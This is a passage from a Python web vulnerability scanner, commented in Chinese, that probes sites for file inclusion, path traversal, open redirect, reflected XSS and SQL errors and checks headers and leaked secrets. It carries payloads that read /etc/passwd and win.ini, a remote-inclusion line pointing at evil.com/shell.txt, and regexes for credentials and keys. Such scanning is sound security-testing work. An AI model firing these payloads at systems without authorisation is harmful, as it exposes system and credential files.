                            'description': f"命令注入可能 - {description}",
                            'evidence': '响应出现命令执行输出特征且内容明显变化'
                        })

                except:
                    continue

        return vulns

    def test_file_inclusion(self, target: str, injection_points: Optional[Dict] = None) -> List[Dict]:
        """文件包含测试"""
        payloads = [
            ("../../../../etc/passwd", "读取passwd文件"),
            ("../../../../windows/win.ini", "读取Windows配置文件"),
            ("php://filter/convert.base64-encode/resource=index.php", "PHP过滤器"),
            ("http://evil.com/shell.txt", "远程文件包含")
        ]

        vulns = []
        default_params = ['file', 'page', 'template', 'include']
        test_params = self.merge_params(
            (injection_points or {}).get('get_params'), default_params, 6
        )

        for param in test_params:
            for payload, description in payloads[:2]:  # 只测试本地文件包含
                test_url = f"{target}?{param}={payload}"

                try:
                    response = self.session.get(test_url, timeout=self.timeout, verify=False)
                    content = response.text

                    # 检测常见文件内容
                    if 'root:' in content or '[extensions]' in content:
                        vulns.append({
                            'type': 'file_inclusion',
                            'severity': 'high',
                            'url': test_url,
                            'payload': payload,
                            'description': f"文件包含漏洞 - {description}",
                            'evidence': '成功读取系统文件'
                        })
                        break

                except:
                    continue

        return vulns

    def test_path_traversal(self, target: str, injection_points: Optional[Dict] = None) -> List[Dict]:
        """路径遍历测试"""
        payloads = [
            ("../../../etc/passwd", "Linux路径遍历"),
            ("..\\..\\..\\windows\\win.ini", "Windows路径遍历"),
            ("....//....//....//etc/passwd", "双重编码绕过")
        ]

        vulns = []
        default_params = ['file', 'path', 'folder', 'directory']
        test_params = self.merge_params(
            (injection_points or {}).get('get_params'), default_params, 6
        )

        for param in test_params:
            for payload, description in payloads:
                test_url = f"{target}?{param}={payload}"

                try:
                    response = self.session.get(test_url, timeout=self.timeout, verify=False)
                    content = response.text

                    if 'root:' in content or '[fonts]' in content:
                        vulns.append({
                            'type': 'path_traversal',
                            'severity': 'high',
                            'url': test_url,
                            'payload': payload,
                            'description': f"路径遍历漏洞 - {description}",
                            'evidence': '成功读取系统文件'
                        })
                        break

                except:
                    continue

        return vulns

    def test_open_redirect(self, target: str, injection_points: Optional[Dict] = None) -> List[Dict]:
        """开放重定向检测：检查跳转参数是否会跳到外部域名（不跟随重定向，只看 Location）"""
        vulns = []
        marker_url = 'https://example.com/yujian'
        default_params = ['url', 'redirect', 'redirect_uri', 'return', 'returnurl',
                          'next', 'target', 'dest', 'goto', 'continue', 'redir']
        test_params = self.merge_params(
            (injection_points or {}).get('get_params'), default_params, 8
        )

        for param in test_params:
            try:
                resp = self.session.get(
                    target, params={param: marker_url},
                    timeout=self.timeout, verify=False, allow_redirects=False
                )
            except Exception:
                continue

            if resp.status_code in (301, 302, 303, 307, 308):
                location = resp.headers.get('Location', '')
                if location.startswith('https://example.com'):
                    vulns.append({
                        'type': 'open_redirect',
                        'severity': 'medium',
                        'url': resp.url,
                        'payload': marker_url,
                        'description': f"开放重定向 - 参数 {param} 可跳转至外部域名",
                        'evidence': f"Location: {location}"
                    })
                    break  # 一个证据足够，换下一个参数

        return vulns

    def test_post_forms(self, injection_points: Dict) -> List[Dict]:
        """对提取到的表单做 XSS 反射与 SQL 报错测试（GET/POST 均支持）"""
        vulns = []
        forms = (injection_points or {}).get('forms', [])[:5]
        if not forms:
            return vulns

        xss_payload = "<script>alert('XSS')</script>"
        sqli_payload = "'"

        def build_data(form, payload):
            data = {}
            for inp in form['inputs']:
                ftype = inp['type']
                if ftype == 'hidden':
                    data[inp['name']] = inp['value'] or 'test'
                elif ftype in ('submit', 'button', 'image'):
                    data[inp['name']] = inp['value'] or 'submit'
                elif ftype in ('checkbox', 'radio'):
                    data[inp['name']] = inp['value'] or 'on'
                elif ftype == 'password':
                    data[inp['name']] = 'Test123!'
                elif ftype == 'file':
                    continue
                else:
                    data[inp['name']] = payload
            return data

        def submit(form, payload):
            data = build_data(form, payload)
            if form['method'] == 'post':
                return self.session.post(
                    form['action'], data=data,
                    timeout=self.timeout, verify=False
                )
            return self.session.get(
                form['action'], params=data,
                timeout=self.timeout, verify=False
            )

        for form in forms:
            # XSS 反射测试
            try:
                resp = submit(form, xss_payload)
                ctype = resp.headers.get('Content-Type', '').lower()
                if 'json' not in ctype and xss_payload in resp.text:
                    vulns.append({
                        'type': 'xss',
                        'severity': 'medium',
                        'url': resp.url,
                        'payload': xss_payload,
                        'description': f"表单({form['method'].upper()}) XSS反射",
                        'evidence': 'payload 被反射到HTML响应中'
                    })
            except Exception:
                pass

            # SQL 报错测试
            try:
                resp = submit(form, sqli_payload)
                content = resp.text.lower()
                matched = [p for p in self.SQL_ERROR_PATTERNS if p in content]
                if matched:
                    vulns.append({
                        'type': 'sql_injection',
                        'severity': 'high',
                        'url': form['action'],
                        'payload': sqli_payload,
                        'description': f"表单({form['method'].upper()}) SQL注入可能",
                        'evidence': f"发现数据库错误特征: {matched[0]}"
                    })
            except Exception:
                pass

        return vulns

    def security_checks(self, target: str) -> List[Dict]:
        """安全检查"""
        issues = []

        # 1. 检查安全头
        try:
            response = self.session.get(target, timeout=5, verify=False)
            headers = response.headers

            security_headers = {
                'X-Frame-Options': '防止点击劫持',
                'X-Content-Type-Options': '防止MIME类型混淆',
                'X-XSS-Protection': 'XSS保护',
                'Content-Security-Policy': '内容安全策略',
                'Strict-Transport-Security': '强制HTTPS',
                'Referrer-Policy': '控制Referer信息'
            }

            missing = []
            for header, description in security_headers.items():
                if header not in headers:
                    missing.append(header)

            if missing:
                issues.append({
                    'type': 'missing_security_headers',
                    'severity': 'medium',
                    'description': f"缺少安全头: {', '.join(missing)}",
                    'recommendation': '配置适当的安全HTTP头'
                })

        except:
            pass

        # 2. 检查HTTP方法
        try:
            response = self.session.request('OPTIONS', target, timeout=5, verify=False)
            if 'allow' in response.headers:
                methods = response.headers['allow']
                if 'PUT' in methods or 'DELETE' in methods:
                    issues.append({
                        'type': 'dangerous_http_methods',
                        'severity': 'medium',
                        'description': f"启用的危险HTTP方法: {methods}",
                        'recommendation': '禁用不必要的HTTP方法'
                    })
        except:
            pass

        # 3. 检查信息泄露（要求具体的赋值/键值上下文，避免 config/test 等普通词汇误报）
        try:
            response = self.session.get(target, timeout=5, verify=False)
            content = response.text

            sensitive_patterns = [
                (r'password\s*[:=]\s*["\']?[^"\'\s]{3,}', '密码明文'),
                (r'(api[_-]?key|secret[_-]?key|access[_-]?token|auth[_-]?token)\s*[:=]\s*["\']?[A-Za-z0-9_\-]{8,}', 'API密钥/Token'),
                (r'db[_-]?(password|passwd|pwd)\s*[:=]', '数据库凭证'),
                (r'-----BEGIN [A-Z ]+PRIVATE KEY-----', '私钥泄露'),
                (r'AWS_ACCESS_KEY_ID', 'AWS凭证'),
                (r'(jdbc:|mongodb://|mysql://|postgres://|redis://)[^\s"\']+', '数据库连接串'),
            ]

            found = []
            for pattern, description in sensitive_patterns:
                if re.search(pattern, content, re.IGNORECASE):
                    found.append(description)

            if found:
                issues.append({
                    'type': 'information_disclosure',
                    'severity': 'low',
                    'description': f"可能的信息泄露: {', '.join(found[:3])}",
                    'recommendation': '移除敏感信息'
                })

        except:
            pass

        return issues

    def identify_auth_points(self, target: str, found_paths: List[Dict]) -> List[Dict]:
        """识别认证入口点"""
        auth_points = []

        for path_info in found_paths:
            if path_info['type'] in ['login_page', 'admin_panel']:
                auth_points.append({
                    'url': path_info['url'],
                    'type': path_info['type'],
                    'status': path_info['status']
                })

        # 如果没有找到，检查常见登录路径
        if not auth_points:
            common_auth_paths = [
                '/login', '/signin', '/auth', '/admin', '/wp-login.php'
            ]

            for path in common_auth_paths:
                url = urljoin(target, path)
                try:
                    response = self.session.get(url, timeout=5, verify=False)
                    if response.status_code in [200, 301, 302]:
                        auth_points.append({
                            'url': url,
                            'type': 'potential_auth',
                            'status': response.status_code
                        })
                except:
                    pass

        return auth_points


# 测试函数
def test_scanner():
    """测试扫描器"""
    print("=" * 60)
    print("🧪 通用扫描器测试")
    print("=" * 60)

    config = {
        'scan': {
            'threads': 5,
            'timeout': 10,
            'depth': 'normal'
        }
    }

    scanner = UniversalScanner(config)

    # 测试扫描功能
    test_target = "http://example.com"
    recon_info = {'tech_stack': ['PHP'], 'cms': None}

    print(f"测试目标: {test_target}")
    results = scanner.comprehensive_scan(test_target, recon_info)

    print(f"\n扫描结果:")
    print(f"  发现漏洞: {len(results['vulnerabilities'])} 个")
    print(f"  敏感路径: {len(results['sensitive_paths'])} 个")
    print(f"  安全问题: {len(results['security_issues'])} 个")
    print(f"  认证入口: {len(results['authentication_points'])} 个")

    print("\n" + "=" * 60)


if __name__ == "__main__":
    test_scanner()